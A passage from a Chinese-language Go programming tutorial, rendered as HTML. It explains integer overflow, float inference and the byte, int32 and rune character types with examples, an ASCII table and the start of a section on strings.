&#123;&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment"># command-line-arguments</span><span class="hljs-comment">.\main.go:5:15: constant 270 overflows uint8</span><span class="hljs-comment"></span><span class="hljs-comment">Compilation finished with exit code 2</span><span class="hljs-comment">*/</span></code></pre><p>这个示例就相当于语法错误了，数值已经溢出了该数据类型，编译都编不过。<br>使用 IDE，就会提示错误：</p><h5 id="3-1-3-2-数据类型运行时的溢出"><a href="#3-1-3-2-数据类型运行时的溢出" class="headerlink" title="3.1.3.2 数据类型运行时的溢出"></a>3.1.3.2 数据类型运行时的溢出</h5><p>以下示例会导致运行时的溢出：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> myint <span class="hljs-keyword">uint8</span>myint = <span class="hljs-number">250</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++ &#123;fmt.Println(myint)myint++&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">250</span><span class="hljs-comment">251</span><span class="hljs-comment">252</span><span class="hljs-comment">253</span><span class="hljs-comment">254</span><span class="hljs-comment">255</span><span class="hljs-comment">0</span><span class="hljs-comment">1</span><span class="hljs-comment">2</span><span class="hljs-comment">3</span><span class="hljs-comment">4</span><span class="hljs-comment">5</span><span class="hljs-comment">6</span><span class="hljs-comment">7</span><span class="hljs-comment">8</span><span class="hljs-comment"></span><span class="hljs-comment">Process finished with exit code 0</span><span class="hljs-comment">*/</span></code></pre><p>这个示例属于逻辑错误，不会报错，但是会影响到最终的结果。</p><h3 id="3-2-浮点型"><a href="#3-2-浮点型" class="headerlink" title="3.2 浮点型"></a>3.2 浮点型</h3><p>下例中，f2 会被自动推导成为 <code>float64</code> 类型：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;f2 := <span class="hljs-number">3.14</span>fmt.Printf(<span class="hljs-string">&quot;f2 type is : %T\n&quot;</span>, f2) <span class="hljs-comment">//f2 type is : float64</span>&#125;</code></pre><p><code>float64</code> 比 <code>float32</code> 更加准确。使用自动推导类型的时候，浮点数会被推导成为 <code>float64</code> 类型。</p><h3 id="3-3-字符类型"><a href="#3-3-字符类型" class="headerlink" title="3.3 字符类型"></a>3.3 字符类型</h3><p>字符只是数值的特殊用例，Golang 使用数值来表示一个字符。<br>Golang 中，使用 <code>byte</code>、<code>int32</code>、<code>rune</code> 类型，来代表一个字符，一个字符由一对单引号 <code>&#39;&#39;</code> 包裹起来。<br><code>byte</code> 类型（字节类型），它的本质是 <code>uint8</code> 类型，存储的时候会以一个 <code>uint8</code> 数值进行存储。<br><code>int32</code> 类型，代表一个 <code>UTF-8</code> 字符。它还有另外一个书写方式：<code>rune</code>，两者是完全等价的，只是书写方式的不同而已（就像本名和小名，<code>int32</code> 是本名，<code>rune</code> 是小名）。</p><h4 id="3-3-1-用byte表示一个单字符"><a href="#3-3-1-用byte表示一个单字符" class="headerlink" title="3.3.1 用byte表示一个单字符"></a>3.3.1 用byte表示一个单字符</h4><p><code>byte</code> 类型的本质是用 <code>uint8</code> 类型进行存储，<code>uint8</code> 的范围是 <code>[0~255]</code>。使用 <code>byte</code> 类型存储一个字符的时候，注意不要超出 <code>uint8</code> 的范围。</p><h5 id="3-3-1-1-byte类型的基本使用"><a href="#3-3-1-1-byte类型的基本使用" class="headerlink" title="3.3.1.1 byte类型的基本使用"></a>3.3.1.1 byte类型的基本使用</h5><p>可以把 <code>[0~255]</code> 范围内的任意整数赋值给一个 <code>byte</code> 类型。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> ch <span class="hljs-keyword">byte</span> <span class="hljs-comment">//声明字符类型</span>ch = <span class="hljs-number">97</span>fmt.Println(<span class="hljs-string">&quot;ch =&quot;</span>, ch)        <span class="hljs-comment">//打印出数字97，因为Golang是使用一个整型数值来表示一个字符</span>fmt.Printf(<span class="hljs-string">&quot;%c, %d\n&quot;</span>, ch, ch) <span class="hljs-comment">//%c，指定以字符方式打印</span>fmt.Println(<span class="hljs-string">&quot;--------------------------&quot;</span>)ch = <span class="hljs-string">&#x27;A&#x27;</span>fmt.Println(<span class="hljs-string">&quot;ch =&quot;</span>, ch)<span class="hljs-comment">//%v是万能匹配格式符，表示该变量本身的值</span><span class="hljs-comment">//因为Golang是使用一个整型数值来表示一个字符，因此ch本身的值就是一个整型数值</span>fmt.Printf(<span class="hljs-string">&quot;%%v=%v, %%c=%c\n&quot;</span>, ch, ch)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">ch = 97</span><span class="hljs-comment">a, 97</span><span class="hljs-comment">--------------------------</span><span class="hljs-comment">ch = 65</span><span class="hljs-comment">%v=65, %c=A</span><span class="hljs-comment">*/</span></code></pre><p>输出时，如果想要看到一个完整的字符，需要指定以字符 <code>%c</code> 格式显示，否则字符类型是以它本质的 <code>uint8</code> 数值来显示的。</p><h5 id="3-3-1-2-使用自动推导时，一个字符会被推导成-int32-类型"><a href="#3-3-1-2-使用自动推导时，一个字符会被推导成-int32-类型" class="headerlink" title="3.3.1.2 使用自动推导时，一个字符会被推导成 int32 类型"></a>3.3.1.2 使用自动推导时，一个字符会被推导成 <code>int32</code> 类型</h5><p>使用自动推导类型的时候，一个字符会被推导成 <code>int32</code> 类型。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;ch := <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-comment">//&#x27;a&#x27;是一个字符</span>fmt.Println(<span class="hljs-string">&quot;ch = &quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;ch type is : %T\n&quot;</span>, ch) <span class="hljs-comment">//自动推导成int32类型</span>fmt.Printf(<span class="hljs-string">&quot;%%v = %v\n&quot;</span>, ch)        <span class="hljs-comment">//%v万能匹配格式符，表示该变量本身的值</span>fmt.Printf(<span class="hljs-string">&quot;%%c = %c\n&quot;</span>, ch)        <span class="hljs-comment">//%c指定以字符输出</span>fmt.Println(<span class="hljs-string">&quot;----------------------&quot;</span>)ch = <span class="hljs-string">&#x27;中&#x27;</span>fmt.Println(<span class="hljs-string">&quot;ch = &quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;ch type is : %T\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;%%v = %v\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;%%c = %c\n&quot;</span>, ch)fmt.Println(<span class="hljs-string">&quot;----------------------&quot;</span>)ch = <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-comment">//英文状态下的逗号</span>fmt.Println(<span class="hljs-string">&quot;ch = &quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;ch type is : %T\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;%%v = %v\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;%%c = %c\n&quot;</span>, ch)ch = <span class="hljs-string">&#x27;，&#x27;</span> <span class="hljs-comment">//中文状态下的逗号</span>fmt.Println(<span class="hljs-string">&quot;ch = &quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;ch type is : %T\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;%%v = %v\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;%%c = %c\n&quot;</span>, ch)fmt.Println(<span class="hljs-string">&quot;----------------------&quot;</span>)ch = <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-comment">//换行符</span>fmt.Println(<span class="hljs-string">&quot;ch = &quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;ch type is : %T\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;%%v = %v\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;%%c = %c&quot;</span>, ch) <span class="hljs-comment">//换行符是控制字符，不会直接显示，但会产生换行效果</span>&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">ch =  97</span><span class="hljs-comment">ch type is : int32</span><span class="hljs-comment">%v = 97</span><span class="hljs-comment">%c = a</span><span class="hljs-comment">----------------------</span><span class="hljs-comment">ch =  20013</span><span class="hljs-comment">ch type is : int32</span><span class="hljs-comment">%v = 20013</span><span class="hljs-comment">%c = 中</span><span class="hljs-comment">----------------------</span><span class="hljs-comment">ch =  44</span><span class="hljs-comment">ch type is : int32</span><span class="hljs-comment">%v = 44</span><span class="hljs-comment">%c = ,</span><span class="hljs-comment">ch =  65292</span><span class="hljs-comment">ch type is : int32</span><span class="hljs-comment">%v = 65292</span><span class="hljs-comment">%c = ，</span><span class="hljs-comment">----------------------</span><span class="hljs-comment">ch =  10</span><span class="hljs-comment">ch type is : int32</span><span class="hljs-comment">%v = 10</span><span class="hljs-comment">%c = </span><span class="hljs-comment">//&#x27;\n&#x27;会产生换行效果，即使fmt.Printf()格式化字符串中不在末尾写&#x27;\n&#x27;，也会发生换行</span><span class="hljs-comment">*/</span></code></pre><p>可以看到，无论是单字符还是复合字符，就算本身是个 ASCII 码字符。只要用了自动推导类型，那么这个字符就会被推导成 <code>int32</code> 类型。<br>我个人猜想，Golang 并不能很明确地确定（或者判定时会影响一点性能）这个字符到底是单字符还是复合字符。所以就用了 <code>int32</code> 类型来保证能够存储任何类型字符，<code>int32</code> 类型也可以书写成 <code>rune</code> 类型，<code>rune</code> 类型的本质是 <code>int32</code> 类型。</p><h4 id="3-3-2-案例"><a href="#3-3-2-案例" class="headerlink" title="3.3.2 案例"></a>3.3.2 案例</h4><h5 id="3-3-2-1-案例1：英文字母大小写转换"><a href="#3-3-2-1-案例1：英文字母大小写转换" class="headerlink" title="3.3.2.1 案例1：英文字母大小写转换"></a>3.3.2.1 案例1：英文字母大小写转换</h5><p><code>byte</code> 本质上是 <code>uint8</code> 类型，所以两者可以直接相互转换、运算。格式化时，用 <code>%c</code> 来表示一个字符，用 <code>%d</code> 来表示整型数值。<br>英文字母大小写转换时，使用字符类型进行操作会非常好用。大小写之间的规律：大小写相差 32，小写的数值大。（大写 A 是 65，小写 a 是 97）<br>例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;大写A:%d，小写a: %d\n&quot;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">//大写A:65，小写a:97</span>fmt.Printf(<span class="hljs-string">&quot;大写A转小写a: %c\n&quot;</span>, <span class="hljs-string">&#x27;A&#x27;</span>+<span class="hljs-number">32</span>)     <span class="hljs-comment">//大写A转小写a: a</span>fmt.Printf(<span class="hljs-string">&quot;小写a转大写A：%c\n&quot;</span>, <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">-32</span>)      <span class="hljs-comment">//小写a转大写A：A</span>&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">大写A:65，小写a: 97</span><span class="hljs-comment">大写A转小写a: a</span><span class="hljs-comment">小写a转大写A：A</span><span class="hljs-comment">*/</span></code></pre><h5 id="3-3-2-2-案例2：计算英文单词每个字母加起来的值"><a href="#3-3-2-2-案例2：计算英文单词每个字母加起来的值" class="headerlink" title="3.3.2.2 案例2：计算英文单词每个字母加起来的值"></a>3.3.2.2 案例2：计算英文单词每个字母加起来的值</h5><h6 id="3-3-2-2-1-题目描述"><a href="#3-3-2-2-1-题目描述" class="headerlink" title="3.3.2.2.1 题目描述"></a>3.3.2.2.1 题目描述</h6><p>英语 26 个字母分别代表 1 到 26 的数字，编写一段代码，计算出单词的每个字母加起来等于多少。<br>例如：<br>hardwork（勤奋）8+1+18+4+23+15+18+11=98<br>knowledge（知识）11+14+15+23+12+5+4+7+5=96<br>love（爱）12+15+22+5=54<br>luck（运气）12+21+3+11=47<br>attitude（态度）1+20+20+9+20+21+4+5=100</p><h6 id="3-3-2-2-2-实现方式"><a href="#3-3-2-2-2-实现方式" class="headerlink" title="3.3.2.2.2 实现方式"></a>3.3.2.2.2 实现方式</h6><p>实现方式有很多，这里采用：对字符本身的 Unicode 码值的运算来实现。<br>实现思路：<br>Golang 中，字符串的存储方式是：采用 UTF-8 编码格式下的 Unicode 码值，进行存储。遍历字符串中的每个字符，都将得到这个字符的 Unicode 码值。<br>假设，输入的都是正确的英文单词。那么单词中的每个字母，它就是一个字符，可以得到它本身的 Unicode 码值。<br>通过减值的方式来确定字母的大小写。大写字母的范围是 [65 ~ 90]， 小写字母的范围是 [97 ~ 122]，任何一个大写字母减去 96，都会小于 1，因此遇到大写字母，需要减去 64，刚好能够对应上 26 个字母，由 1 到 26 的数值排列。小写字母直接减去 96，就能对应上了。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-comment">// 计算一个英文单词中的每个字母之和</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">computeletters</span><span class="hljs-params">(s <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(sum <span class="hljs-keyword">int64</span>)</span></span> &#123;<span class="hljs-keyword">for</span> i, char := <span class="hljs-keyword">range</span> s &#123;<span class="hljs-comment">// 非英文字母的情况</span><span class="hljs-comment">// 空格的 ASCII 码值为 32，需要把空格的情况添加进去</span><span class="hljs-keyword">if</span> char != <span class="hljs-number">32</span> &amp;&amp; !(char &gt;= <span class="hljs-number">65</span> &amp;&amp; char &lt;= <span class="hljs-number">90</span>) &amp;&amp; !(char &gt;= <span class="hljs-number">97</span> &amp;&amp; char &lt;= <span class="hljs-number">122</span>) &#123;fmt.Printf(<span class="hljs-string">&quot;char:%c, index:%d. does not an english letter.\n&quot;</span>, char, i)<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>&#125;<span class="hljs-keyword">if</span> char == <span class="hljs-number">32</span> &#123;<span class="hljs-comment">// 遇到空格，什么都不做</span>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> char<span class="hljs-number">-96</span> &lt; <span class="hljs-number">1</span> &#123;<span class="hljs-comment">// Unicode 值减去 96，小于了 1，说明这个英文字母是大写的，大写应该减 64</span>sum += <span class="hljs-keyword">int64</span>(char - <span class="hljs-number">64</span>)&#125; <span class="hljs-keyword">else</span> &#123;sum += <span class="hljs-keyword">int64</span>(char - <span class="hljs-number">96</span>)&#125;&#125;<span class="hljs-keyword">return</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;arr := []<span class="hljs-keyword">string</span>&#123;<span class="hljs-string">&quot;hardwork&quot;</span>, <span class="hljs-string">&quot;knowledge&quot;</span>, <span class="hljs-string">&quot;love&quot;</span>, <span class="hljs-string">&quot;luck&quot;</span>, <span class="hljs-string">&quot;attitude&quot;</span>&#125;<span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> arr &#123;v := computeletters(arr[i])fmt.Printf(<span class="hljs-string">&quot;word: %s, total value is:%d\n&quot;</span>, arr[i], v)&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">word: hardwork, total value is:98</span><span class="hljs-comment">word: knowledge, total value is:96</span><span class="hljs-comment">word: love, total value is:54</span><span class="hljs-comment">word: luck, total value is:47</span><span class="hljs-comment">word: attitude, total value is:100</span><span class="hljs-comment">*/</span></code></pre><p><code>byte</code> 类型的本质是 <code>uint8</code> 类型，<code>uint8</code> 类型是一个整型数值，范围 <code>[0~255]</code> 的整数，所以它能与另一个整型数值进行运算。</p><h4 id="3-3-2-用int32类型存储一个复合字符"><a href="#3-3-2-用int32类型存储一个复合字符" class="headerlink" title="3.3.2 用int32类型存储一个复合字符"></a>3.3.2 用int32类型存储一个复合字符</h4><p>当处理中文、日文或者其他复合字符时，则需要用 <code>int32</code> 类型来处理 Unicode 文本。<br><code>int32</code> 类型也可以书写成 <code>rune</code>，<code>rune</code> 类型本质就是 <code>int32</code> 类型。</p><h5 id="3-3-2-1-存储一个中文字符的方式"><a href="#3-3-2-1-存储一个中文字符的方式" class="headerlink" title="3.3.2.1 存储一个中文字符的方式"></a>3.3.2.1 存储一个中文字符的方式</h5><p>先看一个错误的示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> ch <span class="hljs-keyword">byte</span>ch = <span class="hljs-string">&#x27;中&#x27;</span> <span class="hljs-comment">//这行会报错：constant 20013 overflows byte，超出了ASCII码的范围</span>fmt.Printf(<span class="hljs-string">&quot;ch type is : %T\n&quot;</span>, ch)&#125;</code></pre><p>注意：<code>byte</code> 的范围是 <code>[0~255]</code>，20013 明显超出了范围！<br>接下来，使用自动推导的技巧来实现存储一个中文字符：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;ch := <span class="hljs-string">&#x27;中&#x27;</span>fmt.Printf(<span class="hljs-string">&quot;ch type is : %T\n&quot;</span>, ch) <span class="hljs-comment">//int32</span>fmt.Printf(<span class="hljs-string">&quot;using %%v, ch = %v\n&quot;</span>, ch)fmt.Printf(<span class="hljs-string">&quot;using %%c, ch = %c\n&quot;</span>, ch)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">ch type is : int32</span><span class="hljs-comment">using %v, ch = 20013</span><span class="hljs-comment">using %c, ch = 中</span><span class="hljs-comment">*/</span></code></pre><p>与 3.3.1.2 中的示例演示一样：使用自动推导的时候，一个中文字符会被推导成为 <code>int32</code> 类型。</p><h4 id="3-3-4-int32和rune的关系以及区别"><a href="#3-3-4-int32和rune的关系以及区别" class="headerlink" title="3.3.4 int32和rune的关系以及区别"></a>3.3.4 int32和rune的关系以及区别</h4><h5 id="3-3-4-1-int32和rune之间的关系"><a href="#3-3-4-1-int32和rune之间的关系" class="headerlink" title="3.3.4.1 int32和rune之间的关系"></a>3.3.4.1 int32和rune之间的关系</h5><p>等价的关系。<code>rune</code> 只是 <code>int32</code> 的一个别名，在功能上完全等价。</p><h5 id="3-3-4-2-见名知意的区别"><a href="#3-3-4-2-见名知意的区别" class="headerlink" title="3.3.4.2 见名知意的区别"></a>3.3.4.2 见名知意的区别</h5><p>用于更好地让程序猿区分，这个变量是字节值还是无符号整数值。用 <code>rune</code> 来表示一个字符值，用 <code>int32</code> 来表示一个整数值。<br>让人一看这个数据类型就能知道，这个变量的最终用途是什么。<br>例如：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;chars := []<span class="hljs-keyword">rune</span>&#123;<span class="hljs-number">443</span>, <span class="hljs-number">27017</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">3306</span>&#125;fmt.Println(<span class="hljs-keyword">string</span>(chars)) <span class="hljs-comment">//最终作为字符来呈现</span>commonPorts := []<span class="hljs-keyword">int32</span>&#123;<span class="hljs-number">443</span>, <span class="hljs-number">27017</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">3306</span>&#125;fmt.Println(<span class="hljs-string">&quot;there are some common ports: &quot;</span>, commonPorts) <span class="hljs-comment">//最终作为数值来呈现</span>&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">ƻ榉ᣫ೪</span><span class="hljs-comment">there are some common ports:  [443 27017 6379 3306]</span><span class="hljs-comment">*/</span></code></pre><p>看到 <code>rune</code> 就知道，最终呈现的是字符；看到 <code>int32</code> 就知道，最终显示数值。个人认为，<code>int32</code> 和 <code>rune</code> 的区别就是见名知意的作用：看它们的数据类型就知道了该数据的最终意图和呈现方式。</p><h4 id="3-3-5-转义字符"><a href="#3-3-5-转义字符" class="headerlink" title="3.3.5 转义字符"></a>3.3.5 转义字符</h4><p>有两种字符：一种是控制字符，另一种是可显示字符。<br>可显示字符就是可以输出，能看得到内容的字符。<br>控制字符就是转义字符，有特殊的含义，是不可见的。以反斜杠 <code>\</code> 开头的是转义字符。<br>例1：先看这个例子：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;hello go&quot;</span>)fmt.Printf(<span class="hljs-string">&quot;abcdefg&quot;</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">hello goabcdefg</span><span class="hljs-comment">//没有换行符，内容会紧跟在上一行的内容后面</span><span class="hljs-comment">/*</span></code></pre><p>例2：<br><code>\n</code> 不会输出到屏幕上，是看不见的。但它会进行换行操作，属于功能性的字符：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;hello go%c&quot;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)fmt.Printf(<span class="hljs-string">&quot;abcdefg&quot;</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">hello go</span><span class="hljs-comment">abcdefg</span><span class="hljs-comment">*/</span></code></pre><h4 id="3-3-6-注意事项"><a href="#3-3-6-注意事项" class="headerlink" title="3.3.6 注意事项"></a>3.3.6 注意事项</h4><h5 id="3-3-6-1-字符只能使用一对单引号包裹起来"><a href="#3-3-6-1-字符只能使用一对单引号包裹起来" class="headerlink" title="3.3.6.1 字符只能使用一对单引号包裹起来"></a>3.3.6.1 字符只能使用一对单引号包裹起来</h5><p>一个字符只能使用一对单引号<code>&#39;&#39;</code>包裹起来！<br>下例中，ch = “a” 这行代码会报错：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> ch <span class="hljs-keyword">byte</span> <span class="hljs-comment">//声明字符类型</span>ch = <span class="hljs-string">&quot;a&quot;</span>    <span class="hljs-comment">//报错：cannot use &quot;a&quot; (type string) as type byte in assignment（不能使用字符串作为byte字符的值）</span>fmt.Printf(<span class="hljs-string">&quot;%c, %d\n&quot;</span>, ch, ch)&#125;</code></pre><p>下例是能够正确运行的：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> ch <span class="hljs-keyword">byte</span> <span class="hljs-comment">//声明字符类型</span>ch = <span class="hljs-string">&#x27;a&#x27;</span>fmt.Printf(<span class="hljs-string">&quot;%c, %d\n&quot;</span>, ch, ch) <span class="hljs-comment">//a, 97</span>&#125;</code></pre><h5 id="3-3-6-2-一对单引号-39-39-中，只能放一个字符"><a href="#3-3-6-2-一对单引号-39-39-中，只能放一个字符" class="headerlink" title="3.3.6.2 一对单引号 &#39;&#39; 中，只能放一个字符"></a>3.3.6.2 一对单引号 <code>&#39;&#39;</code> 中，只能放一个字符</h5><p><code>a := &#39;abc&#39;</code>会报错</p><h5 id="3-3-6-3-byte类型的范围"><a href="#3-3-6-3-byte类型的范围" class="headerlink" title="3.3.6.3 byte类型的范围"></a>3.3.6.3 byte类型的范围</h5><p><code>byte</code> 类型实质上是一个 <code>uint8</code> 类型，<code>uint8</code> 的范围是 <code>[0 ~ 255]</code>（0 和 255 都能被取到），不在这个范围就是值溢出，会报错！<br>数值不在 <code>uint8</code> 范围内的错误示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> ch <span class="hljs-keyword">byte</span> <span class="hljs-comment">//声明字符类型</span>ch = <span class="hljs-number">256</span>fmt.Printf(<span class="hljs-string">&quot;%c, %d\n&quot;</span>, ch, ch)<span class="hljs-comment">/* 报错内容如下：</span><span class="hljs-comment"># command-line-arguments</span><span class="hljs-comment">.\main.go:7:7: constant 256 overflows byte</span><span class="hljs-comment">*/</span>&#125;</code></pre><h4 id="3-3-7-ASCII码参考表"><a href="#3-3-7-ASCII码参考表" class="headerlink" title="3.3.7 ASCII码参考表"></a>3.3.7 ASCII码参考表</h4><table><thead><tr><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th></tr></thead><tbody><tr><td>0</td><td>NUT</td><td>32</td><td>(space)</td><td>64</td><td>@</td><td>96</td><td>、</td></tr><tr><td>1</td><td>SOH</td><td>33</td><td>!</td><td>65</td><td>A</td><td>97</td><td>a</td></tr><tr><td>2</td><td>STX</td><td>34</td><td>“</td><td>66</td><td>B</td><td>98</td><td>b</td></tr><tr><td>3</td><td>ETX</td><td>35</td><td>#</td><td>67</td><td>C</td><td>99</td><td>c</td></tr><tr><td>4</td><td>EOT</td><td>36</td><td>$</td><td>68</td><td>D</td><td>100</td><td>d</td></tr><tr><td>5</td><td>ENQ</td><td>37</td><td>%</td><td>69</td><td>E</td><td>101</td><td>e</td></tr><tr><td>6</td><td>ACK</td><td>38</td><td>&amp;</td><td>70</td><td>F</td><td>102</td><td>f</td></tr><tr><td>7</td><td>BEL</td><td>39</td><td>,</td><td>71</td><td>G</td><td>103</td><td>g</td></tr><tr><td>8</td><td>BS</td><td>40</td><td>(</td><td>72</td><td>H</td><td>104</td><td>h</td></tr><tr><td>9</td><td>HT</td><td>41</td><td>)</td><td>73</td><td>I</td><td>105</td><td>i</td></tr><tr><td>10</td><td>LF</td><td>42</td><td>*</td><td>74</td><td>J</td><td>106</td><td>j</td></tr><tr><td>11</td><td>VT</td><td>43</td><td>+</td><td>75</td><td>K</td><td>107</td><td>k</td></tr><tr><td>12</td><td>FF</td><td>44</td><td>,</td><td>76</td><td>L</td><td>108</td><td>l</td></tr><tr><td>13</td><td>CR</td><td>45</td><td>-</td><td>77</td><td>M</td><td>109</td><td>m</td></tr><tr><td>14</td><td>SO</td><td>46</td><td>.</td><td>78</td><td>N</td><td>110</td><td>n</td></tr><tr><td>15</td><td>SI</td><td>47</td><td>/</td><td>79</td><td>O</td><td>111</td><td>o</td></tr><tr><td>16</td><td>DLE</td><td>48</td><td>0</td><td>80</td><td>P</td><td>112</td><td>p</td></tr><tr><td>17</td><td>DCI</td><td>49</td><td>1</td><td>81</td><td>Q</td><td>113</td><td>q</td></tr><tr><td>18</td><td>DC2</td><td>50</td><td>2</td><td>82</td><td>R</td><td>114</td><td>r</td></tr><tr><td>19</td><td>DC3</td><td>51</td><td>3</td><td>83</td><td>S</td><td>115</td><td>s</td></tr><tr><td>20</td><td>DC4</td><td>52</td><td>4</td><td>84</td><td>T</td><td>116</td><td>t</td></tr><tr><td>21</td><td>NAK</td><td>53</td><td>5</td><td>85</td><td>U</td><td>117</td><td>u</td></tr><tr><td>22</td><td>SYN</td><td>54</td><td>6</td><td>86</td><td>V</td><td>118</td><td>v</td></tr><tr><td>23</td><td>TB</td><td>55</td><td>7</td><td>87</td><td>W</td><td>119</td><td>w</td></tr><tr><td>24</td><td>CAN</td><td>56</td><td>8</td><td>88</td><td>X</td><td>120</td><td>x</td></tr><tr><td>25</td><td>EM</td><td>57</td><td>9</td><td>89</td><td>Y</td><td>121</td><td>y</td></tr><tr><td>26</td><td>SUB</td><td>58</td><td>:</td><td>90</td><td>Z</td><td>122</td><td>z</td></tr><tr><td>27</td><td>ESC</td><td>59</td><td>;</td><td>91</td><td>[</td><td>123</td><td>{</td></tr><tr><td>28</td><td>FS</td><td>60</td><td>&lt;</td><td>92</td><td>/</td><td>124</td><td>|</td></tr><tr><td>29</td><td>GS</td><td>61</td><td>=</td><td>93</td><td>]</td><td>125</td><td>}</td></tr><tr><td>30</td><td>RS</td><td>62</td><td>&gt;</td><td>94</td><td>^</td><td>126</td><td>`</td></tr><tr><td>31</td><td>US</td><td>63</td><td>?</td><td>95</td><td>_</td><td>127</td><td>DEL</td></tr></tbody></table><h3 id="3-4-字符串类型"><a href="#3-4-字符串类型" class="headerlink" title="3.4 字符串类型"></a>3.4 字符串类型</h3><p>由多个字符所组成的一串内容，被称为字符串。一个字符串需要用双引号 <code>&quot;&quot;</code> 包裹起来！<br>Golang 中的字符串以 <code>UTF-8</code> 编码方式存储，处理字符串也是采用 <code>UTF-8</code> 的编码方式，每个字符串都是 <code>Unicode</code> 字符集。</p><h4 id="3-4-1-rune-类型是数值类型，与字符串类型不兼容"><a href="#3-4-1-rune-类型是数值类型，与字符串类型不兼容" class="headerlink" title="3.4.1 rune 类型是数值类型，与字符串类型不兼容"></a>3.4.1 <code>rune</code> 类型是数值类型，与字符串类型不兼容</h4><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> str1 <span class="hljs-keyword">string</span>str1 = <span class="hljs-string">&#x27;abc&#x27;</span> <span class="hljs-comment">// 报错：Cannot use &#x27;&#x27;abc&#x27;&#x27; (type rune) as type string in assignment</span>fmt.Println(str1)&#125;</code></pre><p><code>str1 = &#39;abc&#39; </code>这行会报错！字符只能使用单引号 